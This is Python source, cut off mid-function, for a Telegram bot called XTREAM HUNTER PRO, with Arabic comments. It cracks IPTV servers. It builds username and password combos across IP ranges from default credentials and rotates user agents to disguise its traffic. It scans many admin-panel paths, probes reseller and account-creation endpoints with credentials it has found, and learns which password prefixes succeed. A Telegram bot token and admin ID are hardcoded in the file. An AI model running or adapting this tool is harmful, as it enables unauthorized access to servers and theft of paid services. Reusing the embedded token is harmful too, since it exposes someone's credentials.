#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║        🎯  XTREAM HUNTER PRO  v22  —  Telegram Bot                  ║
"""

import subprocess
import sys
import os

# ════════════════════════════════════════════════════════════════
#  📦  التثبيت التلقائي للمكتبات
# ════════════════════════════════════════════════════════════════
def _bootstrap() -> None:
    import importlib.util

    REQUIRED: list[tuple[str, str, str]] = [
        ("aiohttp",  "aiohttp>=3.9.5",                     ""),
        ("telegram", "python-telegram-bot[job-queue]==21.5", "20.0"),
    ]

    def _check_pkg(import_name: str, min_ver: str) -> bool:
        if not importlib.util.find_spec(import_name):
            return False
        if not min_ver:
            return True
        try:
            mod = __import__(import_name)
            ver_str = getattr(mod, "__version__", "0.0")
            ver = tuple(int(x) for x in ver_str.split(".")[:2])
            min_t = tuple(int(x) for x in min_ver.split(".")[:2])
            return ver >= min_t
        except Exception:
            return False

    def _install(pkg: str) -> bool:
        strategies = [
            [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--upgrade", "--break-system-packages"],
            [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--upgrade", "--user"],
            [sys.executable, "-m", "pip", "install", pkg, "--quiet", "--upgrade"],
        ]
        for cmd in strategies:
            try:
                r = subprocess.run(cmd, capture_output=True, timeout=120)
                if r.returncode == 0:
                    return True
            except Exception:
                continue
        return False

    needs_install = [(imp, pkg) for imp, pkg, mv in REQUIRED if not _check_pkg(imp, mv)]
    if not needs_install:
        return

    print(f"\n{'═'*52}\n  📦  XTREAM HUNTER PRO v22 — تثبيت المكتبات\n{'═'*52}")
    for import_name, pkg in needs_install:
        print(f"\n  ⬇️  تثبيت: {pkg}")
        if _install(pkg):
            print(f"  ✅  تم تثبيت: {import_name}")
        else:
            print(f"\n  ❌  فشل تثبيت: {pkg}\n  💡  جرّب يدوياً: pip install {pkg}")
            sys.exit(1)
    print(f"\n  ✅  جميع المكتبات جاهزة!\n{'═'*52}\n")
    import importlib
    importlib.invalidate_caches()


_bootstrap()

import asyncio
import io
import ipaddress
import json
import logging

# ════════════════════════════════════════════════════════════════
#  🌍  تحميل ملف .env (اختياري للاستضافة)
# ════════════════════════════════════════════════════════════════
def _load_dotenv():
    env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
    if not os.path.exists(env_path):
        return
    try:
        with open(env_path, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, _, val = line.partition("=")
                key = key.strip()
                val = val.strip().strip('"').strip("'")
                if key and key not in os.environ:
                    os.environ[key] = val
    except Exception:
        pass

_load_dotenv()

import random
import re
import string
import time
import traceback
from collections import defaultdict
from datetime import datetime, timedelta
from functools import wraps
from typing import Optional

import aiohttp
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, InputFile, Update
from telegram.constants import ParseMode, ChatAction
from telegram.error import BadRequest, RetryAfter
from telegram.ext import (
    Application, CallbackQueryHandler, CommandHandler,
    ContextTypes, MessageHandler, filters,
)

# ════════════════════════════════════════════════════════════════
#  ⚙️  إعدادات البوت — عدّل هنا فقط
# ════════════════════════════════════════════════════════════════
BOT_TOKEN    = os.environ.get("BOT_TOKEN", "5090704981:AAFTFKyQ2-ZLVbxDFbhPfGWJtluOpSMmVMI")
_raw_admins  = os.environ.get("ADMIN_IDS", "1735469302")
ADMIN_IDS    = [int(x.strip()) for x in _raw_admins.split(",") if x.strip().isdigit()]
_raw_chat    = os.environ.get("RESULTS_CHAT", "")
RESULTS_CHAT: Optional[int] = int(_raw_chat) if _raw_chat.strip().lstrip("-").isdigit() else None
VERSION      = "v23"
BOT_NAME     = "XTREAM HUNTER PRO"

# ── Logging: stdout + ملف للاستضافة ──────────────────────────
_log_handlers: list = [logging.StreamHandler(sys.stdout)]
_log_file = os.environ.get("LOG_FILE", "")
if _log_file:
    try:
        _log_handlers.append(logging.FileHandler(_log_file, encoding="utf-8"))
    except Exception:
        pass

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=_log_handlers,
    force=True,
)
log = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("aiohttp").setLevel(logging.WARNING)

# ════════════════════════════════════════════════════════════════
#  🎨  عناصر التصميم البصري
# ════════════════════════════════════════════════════════════════
_LINE_THICK = "═" * 34
_LINE_THIN  = "─" * 34
_LINE_MID   = "━" * 26
_LINE_DOT   = "·" * 26

def _box(title: str, subtitle: str = "") -> str:
    t = f"║  🎯  {title:<30}║"
    s = f"║  {subtitle:<32}║\n" if subtitle else ""
    return f"╔{'═'*34}╗\n{t}\n{s}╚{'═'*34}╝"

def _section(icon: str, title: str) -> str:
    return f"\n{_LINE_THIN}\n{icon}  <b>{title}</b>\n{_LINE_THIN}"

# ════════════════════════════════════════════════════════════════
#  🔄  تدوير User-Agent الاحترافي
# ════════════════════════════════════════════════════════════════
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "IPTV-Player/3.1 (compatible; SMART-TV)",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 MAG322 stbapp ver: 4 rev: 2700 Mobile Safari/533.3",
    "VLC/3.0.18 LibVLC/3.0.18",
    "Kodi/19.4 (Linux; Android 11)",
    "TiviMate/4.6.0 (Android)",
    "Perfect Player/1.6.2 (Android)",
    "OTT Navigator/1.6.9.5 (Android)",
    "GSE SMART IPTV/7.2 (iOS)",
]

_ua_index = 0
def _next_ua() -> str:
    global _ua_index
    _ua_index = (_ua_index + 1) % len(_USER_AGENTS)
    return _USER_AGENTS[_ua_index]

def _rand_ua() -> str:
    return random.choice(_USER_AGENTS)

# ════════════════════════════════════════════════════════════════
#  ⚽  كشف beIN Sports
# ════════════════════════════════════════════════════════════════
_BEIN_KW = frozenset([
    "bein","beinsport","bein sport","bein_sport","bein-sport",
    "بي ان","بيين","بي إن",
    "bein1","bein2","bein3","bein4","bein5",
    "bein 1","bein 2","bein 3","bein 4",
    "bein sports 1","bein sports 2","bein sports 3",
])

def _has_bein(text: str) -> bool:
    t = text.lower()
    return any(kw in t for kw in _BEIN_KW)

def _find_bein_channels(streams: list) -> list:
    found = []
    for ch in streams:
        name = str(ch.get("name","") or ch.get("title",""))
        cat  = str(ch.get("category_name","") or ch.get("genre_title",""))
        if (_has_bein(name) or _has_bein(cat)) and name and name not in found:
            found.append(name)
    return found

# ════════════════════════════════════════════════════════════════
#  🌙  كشف القنوات والباقات العربية — v23
# ════════════════════════════════════════════════════════════════

# ── كلمات دلالية للقنوات العربية ────────────────────────────
_ARABIC_CH_KW = frozenset([
    # شبكات عربية كبرى
    "mbc","mbc1","mbc2","mbc3","mbc4","mbc action","mbc drama","mbc masr",
    "rotana","rotana cinema","rotana khalijia","rotana classic","rotana music",
    "osn","osn movies","osn series","osn action","osn yahala",
    "shahid","shahid net",
    "alarabiya","العربية","قناة العربية",
    "aljazeera","الجزيرة","al jazeera","aljazira",
    "alhadath","الحدث","hadath",
    "skynews arabic","سكاي نيوز","sky news arabia",
    "cbc","cbc drama","cbc extra","cbc sofra",
    "on tv","on sport","on live","أون تي في",
    "nile tv","نايل تي في","nile cinema","nile comedy","nile life",
    "dream","dream2","دريم",
    "sbc","saudi","ksa sport","ksa1","ksa2",
    "bahrain tv","kuwait tv","oman tv","qatar tv",
    "dubai tv","دبي","abu dhabi","أبوظبي","ad sport","ad cinema",
    "oman","عمان","bahrain","البحرين","kuwait","الكويت",
    "lbc","lbci","lbc international","al manar","المنار","future tv","mtv lebanon",
    "trt arabic","العالم","iran arabic",
    "al aoula","2m","medi1","snrt","مغرب","tunisie","tunisian",
    "jordan","الأردن","jrtv","petra",
    "syria","سوريا","syrian","الإخبارية السورية",
    "iraq","العراق","iraqi","iraqia",
    "libya","ليبيا","libya alahrar","النبأ","نبأ",
    "sudan","السودان","nile sudan",
    "yemen","اليمن","yemeni","عدن",
    "somalia","الصومال","somali",
    "kids","cartoon arabic","براعم","toyor","طيور الجنة","spacetoon arabic",
    "quran","قرآن","coran","iqraa","اقرأ","nour","نور",
    "sport","رياضة","الرياضية","alkass","القصة","beout",
    "music","موسيقى","nogoom","نجوم","mazika","مزيكا","watan","وطن",
    # حروف عربية مباشرة في الاسم
    "مسلسل","أفلام","أفلام عربية","دراما","كوميدي",
    # ── أسماء شائعة بصيغة AR في قوائم IPTV ─────────────────
    "ar mbc","ar mbc1","ar mbc2","ar mbc3","ar mbc4",
    "ar rotana","ar osn","ar beinsport","ar bein",
    "ar alarabiya","ar aljazeera","ar cbc","ar on",
    "ar sport","ar sports","ar news","ar movies","ar cinema",
    "ar kids","ar music","ar series","ar drama",
    "ar ksa","ar saudi","ar uae","ar egypt","ar iraq",
    "ar kuwait","ar qatar","ar bahrain","ar jordan",
    "ar syria","ar lebanon","ar morocco","ar tunisia","ar libya",
    "ar sudan","ar yemen","ar oman",
    "arabic mbc","arabic rotana","arabic osn","arabic bein",
    "arabic sport","arabic news","arabic movies","arabic kids",
    "arabic series","arabic music","arabic cinema","arabic drama",
])

# ── أنماط regex للنصوص العربية في الاسماء ───────────────────
_ARABIC_UNICODE_RE = re.compile(r'[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]')

# ── أنماط AR prefix الشائعة في قوائم IPTV ─────────────────
# تغطي: AR:, AR |, AR_, AR-, [AR], (AR), AR HD, AR FHD, AR 4K
# وأي اسم يبدأ بـ AR متبوعاً بفاصل أو مسافة — مع تجنب False positives
_AR_PREFIX_RE = re.compile(
    r'^(?:'
    r'ar(?=[\s:|\-_/\\])|'            # AR متبوع بفاصل: AR: / AR | / AR_ / AR-
    r'ar\s+(?:hd|fhd|4k|sd|uhd)\b|'  # AR HD / AR FHD / AR 4K
    r'\[ar\]|'                         # [AR]
    r'\(ar\)|'                         # (AR)
    r'ara(?=[\s:|\-_])|'              # ARA:
    r'arb(?=[\s:|\-_])'               # ARB:
    r')',
    re.IGNORECASE,
)

# أنماط AR محاطة بفواصل داخل الاسم (ليست بداية)
_AR_CONTAINS_RE = re.compile(
    r'(?:'
    r'\|ar\||'                      # |AR|
    r'(?<=[_\-\s])ar(?=[_\-\s])|'  # _AR_ أو -AR- أو سطر مع مسافات
    r'(?<=[_\-\s])ar$'              # ينتهي بـ _AR أو -AR
    r')',
    re.IGNORECASE,
)

# ── كلمات للباقات العربية ────────────────────────────────────
_ARABIC_PKG_KW = frozenset([
    "arabic","arab","عرب","عربي","عربية","arabic package",
    "arabic bouquet","باقة عربية","arabic channels",
    "arabic premium","arabic vip","الباقة العربية",
    "middle east","gulf","خليج","khalij","gulf package",
    "arabic sport","الرياضة العربية",
])

# ── تصنيفات مرئية للمجموعات ─────────────────────────────────
_ARABIC_CATS = frozenset([
    "arabic","arab","عرب","عربية","عربي","arabic channels","arabic package",
    "gulf","خليج","middle east","الشرق الأوسط",
    "egypt","مصر","saudi","السعودية","uae","الإمارات",
    "arabic movies","أفلام عربية","arabic series","مسلسلات عربية",
    "arabic kids","أطفال عربي","arabic music","موسيقى عربية",
    "arabic news","أخبار عربية","arabic sports","رياضة عربية",
    "arabic religion","ديني","quran","قرآن",
])


def _has_arabic_text(text: str) -> bool:
    """هل يحتوي النص على أحرف عربية Unicode؟"""
    return bool(_ARABIC_UNICODE_RE.search(text))


def _has_ar_prefix(text: str) -> bool:
    """
    كشف القنوات الإنجليزية التي تُشير للعربية:
    AR:MBC1 / AR | Rotana / [AR] BeIN / AR HD / AR_Sport / AR-News ...
    """
    t = text.strip()
    if _AR_PREFIX_RE.match(t):
        return True
    if _AR_CONTAINS_RE.search(t):
        return True
    return False


def _has_arabic_channel(text: str) -> bool:
    """
    هل يبدو اسم القناة عربياً؟
    يكشف:
    1. أحرف Unicode عربية في الاسم
    2. بادئات AR: / AR | / [AR] / AR HD ...
    3. كلمات مفتاحية شبكات عربية معروفة
    """
    if not text or not text.strip():
        return False
    # 1. أحرف عربية مباشرة
    if _has_arabic_text(text):
        return True
    # 2. بادئة AR الإنجليزية
    if _has_ar_prefix(text):
        return True
    # 3. كلمات مفتاحية
    t = text.lower().strip()
    return any(kw in t for kw in _ARABIC_CH_KW)


def _has_arabic_package(text: str) -> bool:
    """
    هل اسم الباقة/الفئة عربي؟
    يكشف: كلمات عربية، بادئات AR، أسماء تصنيفات شائعة
    """
    if not text or not text.strip():
        return False
    # أحرف عربية مباشرة
    if _has_arabic_text(text):
        return True
    # بادئة AR في اسم الفئة
    if _has_ar_prefix(text):
        return True
    t = text.lower().strip()
    # كلمة "ar" منفردة كاسم فئة
    if t in ("ar", "ara", "arb", "arabic", "arab"):
        return True
    return any(kw in t for kw in _ARABIC_PKG_KW | _ARABIC_CATS)


def _count_arabic_channels(streams: list) -> dict:
    """
    يعيد:
      total_arabic   : عدد القنوات العربية
      arabic_chs     : قائمة بأسماء القنوات العربية (أول 30)
      arabic_cats    : الفئات/الباقات العربية المكتشفة (set)
      arabic_pkgs    : عدد الباقات العربية
      has_arabic_pkg : هل توجد باقة عربية صريحة؟
      has_arabic_list: هل القائمة بالأساس عربية (>20% قنوات عربية)؟
    """
    arabic_chs  : list[str] = []
    arabic_cats : set[str]  = set()
    seen        : set[str]  = set()
    total_ch                = len(streams)

    for ch in streams:
        name = str(ch.get("name","") or ch.get("title","")).strip()
        cat  = str(ch.get("category_name","") or ch.get("genre_title","") or
                   ch.get("category","") or "").strip()

        is_arabic_name = _has_arabic_channel(name)
        is_arabic_cat  = _has_arabic_package(cat)

        if is_arabic_name and name and name not in seen:
            seen.add(name)
            arabic_chs.append(name)

        if is_arabic_cat and cat:
            arabic_cats.add(cat)

    total_arabic  = len(arabic_chs)
    arabic_pkgs   = len(arabic_cats)
    has_arabic_pkg = arabic_pkgs > 0 or any(
        _has_arabic_package(str(ch.get("category_name","") or "")) for ch in streams[:200]
    )
    has_arabic_list = total_ch > 0 and (total_arabic / total_ch) >= 0.20

    return {
        "total_arabic"  : total_arabic,
        "arabic_chs"    : arabic_chs[:30],
        "arabic_cats"   : sorted(arabic_cats)[:15],
        "arabic_pkgs"   : arabic_pkgs,
        "has_arabic_pkg": has_arabic_pkg,
        "has_arabic_list": has_arabic_list,
    }


def _arabic_badge(info: dict) -> str:
    """شارة جمالية للقنوات العربية"""
    if not info or info["total_arabic"] == 0:
        return "🌙  عربي  ✖️"
    cnt   = info["total_arabic"]
    pkgs  = info["arabic_pkgs"]
    top   = " · ".join(info["arabic_chs"][:4]) + ("…" if cnt > 4 else "")
    badge = f"🌙  <b>عربي ✅  ({cnt} قناة"
    if pkgs:
        badge += f"  /  {pkgs} باقة"
    badge += f")</b>\n     ╰ {top}"
    return badge


def _arabic_pkg_badge(info: dict) -> str:
    """شارة الباقات العربية"""
    if not info or not info["has_arabic_pkg"]:
        return "📦  باقة عربية  ✖️"
    cats = " · ".join(info["arabic_cats"][:3]) + ("…" if info["arabic_pkgs"] > 3 else "")
    return f"📦  <b>باقة عربية ✅  ({info['arabic_pkgs']} فئة)</b>\n     ╰ {cats}"


# ════════════════════════════════════════════════════════════════
#  🌐  Session Pool مع تدوير UA
# ════════════════════════════════════════════════════════════════
class SessionPool:
    __slots__ = ("_limit", "_sess", "_conn", "_lock")

    def __init__(self, limit: int = 400):
        self._limit = min(limit, 600)
        self._sess: Optional[aiohttp.ClientSession] = None
        self._conn: Optional[aiohttp.TCPConnector] = None
        self._lock = asyncio.Lock()

    async def get(self) -> aiohttp.ClientSession:
        async with self._lock:
            if not self._sess or self._sess.closed:
                self._conn = aiohttp.TCPConnector(
                    ssl=False, limit=self._limit, limit_per_host=20,
                    ttl_dns_cache=300, force_close=False,
                    enable_cleanup_closed=True, keepalive_timeout=30,
                )
                self._sess = aiohttp.ClientSession(
                    connector=self._conn,
                    headers={"User-Agent": _rand_ua()},
                    connector_owner=False,
                    timeout=aiohttp.ClientTimeout(total=15),
                )
        return self._sess

    async def close(self) -> None:
        async with self._lock:
            if self._sess and not self._sess.closed:
                await self._sess.close()
                await asyncio.sleep(0.25)
            if self._conn and not self._conn.closed:
                await self._conn.close()
            self._sess = self._conn = None

# ════════════════════════════════════════════════════════════════
#  🌍  مستخرج السيرفرات من الإنترنت
# ════════════════════════════════════════════════════════════════
_SERVER_SOURCES = [
    "https://raw.githubusercontent.com/iptv-org/iptv/master/streams/us.m3u",
    "https://iptv-org.github.io/iptv/index.m3u",
    "https://raw.githubusercontent.com/Free-IPTV/Countries/master/index.m3u",
    "https://pastebin.com/raw/0JpzJVuL",
    "https://pastebin.com/raw/ByfrH7dP",
    "https://bit.ly/xtream-servers-list",
]

# تعبيرات لاستخراج روابط السيرفرات
_SRV_REGEX = re.compile(
    r'https?://(?:[a-zA-Z0-9\-\.]+)(?::\d{2,5})?(?:/[^\s"\'<>]*)?',
    re.IGNORECASE
)
_XTREAM_REGEX = re.compile(
    r'https?://[a-zA-Z0-9\-\.]+:\d{2,5}/?',
    re.IGNORECASE
)

async def fetch_servers_from_web(sources: list = None, timeout: int = 15) -> list:
    """جلب سيرفرات Xtream من مصادر الإنترنت"""
    sources = sources or _SERVER_SOURCES
    found = set()
    connector = aiohttp.TCPConnector(ssl=False, limit=20)
    try:
        async with aiohttp.ClientSession(
            connector=connector,
            headers={"User-Agent": _rand_ua()},
            timeout=aiohttp.ClientTimeout(total=timeout)
        ) as sess:
            tasks = [_fetch_one_source(sess, url) for url in sources]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for raw in results:
                if isinstance(raw, str):
                    for m in _XTREAM_REGEX.finditer(raw):
                        url = m.group(0).rstrip("/")
                        if _looks_like_xtream(url):
                            found.add(url)
    except Exception:
        pass
    finally:
        await connector.close()
    return list(found)

async def _fetch_one_source(sess, url: str) -> str:
    try:
        async with sess.get(url, ssl=False, allow_redirects=True) as r:
            if r.status == 200:
                return await r.text(errors="replace")
    except Exception:
        pass
    return ""

def _looks_like_xtream(url: str) -> bool:
    """هل يبدو الرابط كسيرفر Xtream Codes؟"""
    if "github" in url or "raw." in url or "pastebin" in url:
        return False
    # يجب أن يحتوي على رقم منفذ
    return bool(re.search(r':\d{4,5}/?$', url))

# ════════════════════════════════════════════════════════════════
#  🏗️  مولد كومبو من IP Range
# ════════════════════════════════════════════════════════════════
def generate_combo_from_ip_range(
    ip_range: str,
    ports: list = None,
    usernames: list = None,
    passwords: list = None,
) -> list:
    """توليد كومبو من نطاق IP"""
    ports     = ports     or [8080, 8000, 80, 2082, 2086, 25461, 7878]
    usernames = usernames or ["admin","test","user","demo","iptv","guest","root"]
    passwords = passwords or ["123456","admin","1234","test","iptv","password","iptv123"]

    combo = []
    try:
        network = ipaddress.ip_network(ip_range, strict=False)
        hosts = list(network.hosts())
        if len(hosts) > 1024:
            hosts = hosts[:1024]  # حد أقصى آمن
        for ip in hosts:
            for port in ports[:3]:  # أول 3 منافذ فقط للحجم المعقول
                host = f"http://{ip}:{port}"
                for u in usernames[:3]:
                    for p in passwords[:3]:
                        combo.append((host, u, p))
    except ValueError:
        pass
    return combo

# ════════════════════════════════════════════════════════════════
#  🔑  صيد Admin Panels
# ════════════════════════════════════════════════════════════════
_ADMIN_PATHS = [
    "/admin/", "/admin", "/admin/index.php", "/admin/login.php",
    "/administrator/", "/administrator/index.php",
    "/wp-admin/", "/wp-admin/admin.php",
    "/panel/", "/control/", "/dashboard/",
    "/cp/", "/cpanel/", "/webadmin/",
    "/admin_area/", "/admin_panel/",
    "/backend/", "/manage/", "/management/",
    "/phpmyadmin/", "/pma/",
    "/streamadmin/", "/xtream/admin/",
    "/streaming/admin/", "/api/admin/",
]

_ADMIN_SIGNATURES = [
    "admin panel", "control panel", "dashboard", "login",
    "administrator", "management", "username", "password",
    "sign in", "log in", "admin login",
]

async def detect_admin_panel(
    sess: aiohttp.ClientSession,
    host: str,
    timeout: int = 6,
) -> dict:
    """كشف Admin Panels المفتوحة"""
    result = {
        "found": False,
        "url": "",
        "title": "",
        "open": False,  # مفتوح بدون حماية
        "paths_found": [],
    }
    base = host.rstrip("/")
    for path in _ADMIN_PATHS:
        url = f"{base}{path}"
        try:
            async with sess.get(
                url,
                headers={"User-Agent": _next_ua()},
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False, allow_redirects=True,
            ) as r:
                if r.status in (200, 302, 301):
                    text = (await r.text(errors="replace")).lower()[:3000]
                    is_admin = any(sig in text for sig in _ADMIN_SIGNATURES)
                    # هل هي مفتوحة؟ (لا تحتاج login)
                    is_open = (
                        r.status == 200 and
                        "login" not in text and
                        "password" not in text and
                        ("dashboard" in text or "admin" in text or "panel" in text)
                    )
                    if is_admin or is_open:
                        # استخراج العنوان
                        title_m = re.search(r'<title[^>]*>(.*?)</title>', text, re.IGNORECASE)
                        title = title_m.group(1).strip()[:60] if title_m else path
                        result["paths_found"].append({
                            "url": url, "title": title,
                            "open": is_open, "status": r.status
                        })
                        if not result["found"]:
                            result.update(
                                found=True, url=url,
                                title=title, open=is_open
                            )
        except Exception:
            continue
    return result

# ════════════════════════════════════════════════════════════════
#  👥  كشف Sub-Resellers
# ════════════════════════════════════════════════════════════════
async def detect_sub_reseller(
    sess: aiohttp.ClientSession,
    host: str, user: str, pwd: str, timeout: int,
    data: dict,
) -> dict:
    """كشف إذا كان الحساب sub-reseller"""
    ui = data.get("user_info", {})
    result = {
        "is_reseller": False,
        "can_create": False,
        "credits": 0,
        "max_credits": 0,
        "reseller_info": {},
    }
    # فحص صلاحيات Reseller في user_info
    exp_reseller = ui.get("is_trial") == "0" and ui.get("allowed_output_formats")
    if ui.get("is_restreamer") or ui.get("reseller") or ui.get("allowed_ips"):
        result["is_reseller"] = True
    # فحص API الخاص بالـ Reseller
    try:
        url = f"{host.rstrip('/')}/player_api.php?username={user}&password={pwd}&action=get_reseller_info"
        async with sess.get(
            url,
            headers={"User-Agent": _next_ua()},
            timeout=aiohttp.ClientTimeout(total=timeout),
            ssl=False,
        ) as r:
            if r.status == 200:
                raw = await r.text(errors="replace")
                if raw.strip().startswith("{"):
                    info = json.loads(raw)
                    if info.get("reseller_info") or info.get("credits"):
                        result["is_reseller"] = True
                        result["can_create"]  = True
                        result["credits"]     = int(info.get("credits", 0))
                        result["max_credits"] = int(info.get("max_credits", 0))
                        result["reseller_info"] = info
    except Exception:
        pass
    # فحص endpoint إنشاء حسابات
    try:
        url2 = f"{host.rstrip('/')}/player_api.php?username={user}&password={pwd}&action=create_user"
        async with sess.get(
            url2,
            headers={"User-Agent": _next_ua()},
            timeout=aiohttp.ClientTimeout(total=min(timeout, 4)),
            ssl=False,
        ) as r2:
            if r2.status == 200:
                raw2 = await r2.text(errors="replace")
                # إذا أعطى رسالة غير "unauthorized" → صلاحية إنشاء
                if "unauthorized" not in raw2.lower() and "forbidden" not in raw2.lower():
                    result["is_reseller"] = True
                    result["can_create"]  = True
    except Exception:
        pass
    return result

# ════════════════════════════════════════════════════════════════
#  🧪  كشف Trial Accounts
# ════════════════════════════════════════════════════════════════
def detect_trial_account(data: dict) -> dict:
    """كشف الحسابات التجريبية"""
    ui = data.get("user_info", {})
    result = {
        "is_trial": False,
        "trial_reason": [],
    }
    # فحص is_trial
    if str(ui.get("is_trial","")).lower() in ("1","true","yes"):
        result["is_trial"] = True
        result["trial_reason"].append("is_trial=1")
    # فحص max_connections صغيرة جداً
    max_c = ui.get("max_connections")
    if max_c and str(max_c).isdigit() and int(max_c) <= 1:
        result["trial_reason"].append(f"max_connections={max_c}")
    # فحص تاريخ انتهاء قصير (أقل من 7 أيام)
    exp_raw = ui.get("exp_date") or ui.get("expiration","")
    if exp_raw and str(exp_raw).isdigit():
        try:
            exp_dt = datetime.fromtimestamp(int(exp_raw))
            days_left = (exp_dt - datetime.now()).days
            if 0 < days_left <= 7:
                result["is_trial"] = True
                result["trial_reason"].append(f"expires_in_{days_left}d")
        except Exception:
            pass
    # كلمة trial في اسم الخطة
    plan = str(ui.get("plan_name","") or "").lower()
    if "trial" in plan or "test" in plan or "demo" in plan:
        result["is_trial"] = True
        result["trial_reason"].append(f"plan={plan}")
    if result["trial_reason"] and not result["is_trial"]:
        result["is_trial"] = True
    return result

# ════════════════════════════════════════════════════════════════
#  🗑️  كشف السيرفرات المهملة
# ════════════════════════════════════════════════════════════════
async def detect_abandoned_server(
    sess: aiohttp.ClientSession,
    host: str, user: str, pwd: str, timeout: int,
    data: dict, live_count: int,
) -> dict:
    """كشف السيرفرات المهملة بآلاف الحسابات المفتوحة"""
    result = {
        "is_abandoned": False,
        "indicators": [],
        "open_accounts_estimate": 0,
    }
    ui = data.get("user_info", {})
    si = data.get("server_info", {})

    # مؤشر 1: عدد اتصالات نشطة صفر مع قنوات كثيرة
    active_cons = int(ui.get("active_cons", 0) or 0)
    if live_count > 5000 and active_cons == 0:
        result["indicators"].append(f"live={live_count}_no_active")

    # مؤشر 2: الخادم لا يفرض حدود اتصال
    max_c = ui.get("max_connections")
    if max_c and str(max_c).isdigit() and int(max_c) > 100:
        result["indicators"].append(f"max_conn={max_c}")

    # مؤشر 3: فحص عدد المستخدمين عبر API
    try:
        url = f"{host.rstrip('/')}/player_api.php?username={user}&password={pwd}&action=get_users_count"
        async with sess.get(
            url,
            headers={"User-Agent": _next_ua()},
            timeout=aiohttp.ClientTimeout(total=min(timeout, 5)),
            ssl=False,
        ) as r:
            if r.status == 200:
                raw = await r.text(errors="replace")
                if raw.strip().isdigit():
                    cnt = int(raw.strip())
                    if cnt > 1000:
                        result["indicators"].append(f"users={cnt}")
                        result["open_accounts_estimate"] = cnt
    except Exception:
        pass

    # مؤشر 4: انتهاء صلاحية الخادم ولا يزال يعمل
    srv_exp = si.get("expiration_date","")
    if srv_exp:
        try:
            exp_ts = int(srv_exp)
            exp_dt = datetime.fromtimestamp(exp_ts)
            if exp_dt < datetime.now():
                result["indicators"].append("server_expired_but_running")
        except Exception:
            pass

    if len(result["indicators"]) >= 2:
        result["is_abandoned"] = True

    return result

# ════════════════════════════════════════════════════════════════
#  🧠  الصيد التكيفي — تعلم البادئات الناجحة
# ════════════════════════════════════════════════════════════════
class AdaptiveHunter:
    """بوت يتعلم أي بادئات user/pass تنجح أكثر"""

    def __init__(self):
        self._prefix_success: dict[str, int] = defaultdict(int)
        self._prefix_total:   dict[str, int] = defaultdict(int)
        self._lock = asyncio.Lock()

    def _get_prefix(self, s: str, n: int = 3) -> str:
        return s[:n].lower() if len(s) >= n else s.lower()

    async def record(self, user: str, pwd: str, success: bool):
        async with self._lock:
            up = self._get_prefix(user)
            pp = self._get_prefix(pwd)
            self._prefix_total[f"u:{up}"]  += 1
            self._prefix_total[f"p:{pp}"]  += 1
            if success:
                self._prefix_success[f"u:{up}"] += 1
                self._prefix_success[f"p:{pp}"] += 1

    def get_top_prefixes(self, n: int = 10) -> dict:
        rates = {}
        for k, total in self._prefix_total.items():
            if total >= 3:
                rates[k] = self._prefix_success.get(k, 0) / total
        return dict(sorted(rates.items(), key=lambda x: x[1], reverse=True)[:n])

    def get_priority_score(self, user: str, pwd: str) -> float:
        up = self._get_prefix(user)
        pp = self._get_prefix(pwd)
        u_rate = self._prefix_success.get(f"u:{up}", 0) / max(self._prefix_total.get(f"u:{up}", 1), 1)
        p_rate = self._prefix_success.get(f"p:{pp}", 0) / max(self._prefix_total.get(f"p:{pp}", 1), 1)
        return (u_rate + p_rate) / 2

    def sort_combo_by_priority(self, combo: list) -> list:
        """ترتيب الكومبو بحسب الأولوية المتعلمة"""
        scored = [(c, self.get_priority_score(c[1], c[2])) for c in combo]
        scored.sort(key=lambda x: x[1], reverse=True)
        return [c for c, _ in scored]

    def stats_text(self) -> str:
        top = self.get_top_prefixes(5)
        if not top:
            return "<i>لم يتعلم البوت بعد — ابدأ الصيد</i>"
        lines = []
        for k, rate in top.items():
            kind = "👤 user" if k.startswith("u:") else "🔑 pass"
            prefix = k[2:]
            lines.append(f"  {kind} <code>{prefix}*</code>  →  <b>{rate*100:.1f}%</b>")
        return "\n".join(lines)

# المحرك التكيفي العام
_adaptive = AdaptiveHunter()

# ════════════════════════════════════════════════════════════════
#  🗄️  الأرشفة التلقائية
# ════════════════════════════════════════════════════════════════
_ARCHIVE_MAX = 500  # أقصى عدد نتائج قبل الأرشفة

def auto_archive(st: dict) -> int:
    """نقل النتائج القديمة للأرشيف"""
    archived = 0
    for key in ("results", "mac_results"):
        if len(st[key]) > _ARCHIVE_MAX:
            old = st[key][:-_ARCHIVE_MAX]
            st[key] = st[key][-_ARCHIVE_MAX:]
            st["archive"][key].extend(old)
            archived += len(old)
    return archived

# ════════════════════════════════════════════════════════════════
#  🕐  جدولة الصيد
# ════════════════════════════════════════════════════════════════
_SCHEDULED: dict[int, dict] = {}  # uid -> schedule_info

async def _scheduler_loop(app) -> None:
    """حلقة الجدولة الخلفية — تعمل بشكل مستمر"""
    while True:
        try:
            await asyncio.sleep(30)
            now = datetime.now()
            for uid, sched in list(_SCHEDULED.items()):
                if not sched.get("active"):
                    continue
                scheduled_time = sched.get("time")
                if not scheduled_time:
                    continue
                if now >= scheduled_time and not sched.get("triggered"):
                    sched["triggered"] = True
